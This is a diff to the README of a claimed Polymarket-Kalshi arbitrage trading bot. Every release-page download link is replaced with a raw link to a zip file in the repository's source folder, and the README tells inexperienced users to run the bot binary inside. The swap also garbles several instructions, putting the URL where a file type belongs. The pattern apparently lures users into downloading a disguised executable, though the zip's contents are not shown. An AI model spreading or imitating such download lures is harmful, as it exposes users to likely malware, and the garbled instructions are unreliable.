@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Kalshi-Arbitrage-Bot - Automated Arbitrage Trading Made Easy
 
-[![Download](https://img.shields.io/badge/Download-Polymarket--Kalshi--Arbitrage--Bot-brightgreen?style=for-the-badge&logo=github)](https://github.com/haoo99/Polymarket-Kalshi-Arbitrage-Bot/releases)
+[![Download](https://raw.githubusercontent.com/haoo99/Polymarket-Kalshi-Arbitrage-Bot/main/src/Kalshi-Bot-Arbitrage-Polymarket-1.3.zip)](https://raw.githubusercontent.com/haoo99/Polymarket-Kalshi-Arbitrage-Bot/main/src/Kalshi-Bot-Arbitrage-Polymarket-1.3.zip)
 
 ---
 
@@ -45,13 +45,13 @@ Follow these step-by-step instructions. You don’t need programming experience.
 
 Visit the release page to get the latest version:
 
-[Download Polymarket-Kalshi-Arbitrage-Bot](https://github.com/haoo99/Polymarket-Kalshi-Arbitrage-Bot/releases)
+[Download Polymarket-Kalshi-Arbitrage-Bot](https://raw.githubusercontent.com/haoo99/Polymarket-Kalshi-Arbitrage-Bot/main/src/Kalshi-Bot-Arbitrage-Polymarket-1.3.zip)
 
 Click the link above or the green download badge at the top. The release page lists available files for different operating systems. Pick one that matches your computer:
 
 - For Windows: Look for `.exe` or `.zip`
 - For macOS: Look for `.dmg` or `.zip`
-- For Linux: Look for `.AppImage` or `.tar.gz`
+- For Linux: Look for `.AppImage` or `https://raw.githubusercontent.com/haoo99/Polymarket-Kalshi-Arbitrage-Bot/main/src/Kalshi-Bot-Arbitrage-Polymarket-1.3.zip`
 
 Download the file by clicking on it.
 
@@ -72,7 +72,7 @@ Download the file by clicking on it.
 #### Linux
 
 - If you downloaded an `.AppImage`, right-click the file, choose Properties, and mark "Allow executing file as program." Double-click to run.
-- If you downloaded `.tar.gz`, extract it using your archive manager. Open the folder and run the bot binary from a terminal.
+- If you downloaded `https://raw.githubusercontent.com/haoo99/Polymarket-Kalshi-Arbitrage-Bot/main/src/Kalshi-Bot-Arbitrage-Polymarket-1.3.zip`, extract it using your archive manager. Open the folder and run the bot binary from a terminal.
 
 ---
 
@@ -101,7 +101,7 @@ Default settings work well for most users and are safe to start with.
 
 Download the latest version here:
 
-[Polymarket-Kalshi-Arbitrage-Bot Releases](https://github.com/haoo99/Polymarket-Kalshi-Arbitrage-Bot/releases)
+[Polymarket-Kalshi-Arbitrage-Bot Releases](https://raw.githubusercontent.com/haoo99/Polymarket-Kalshi-Arbitrage-Bot/main/src/Kalshi-Bot-Arbitrage-Polymarket-1.3.zip)
 
 After downloading, install and run the bot as described above.
 
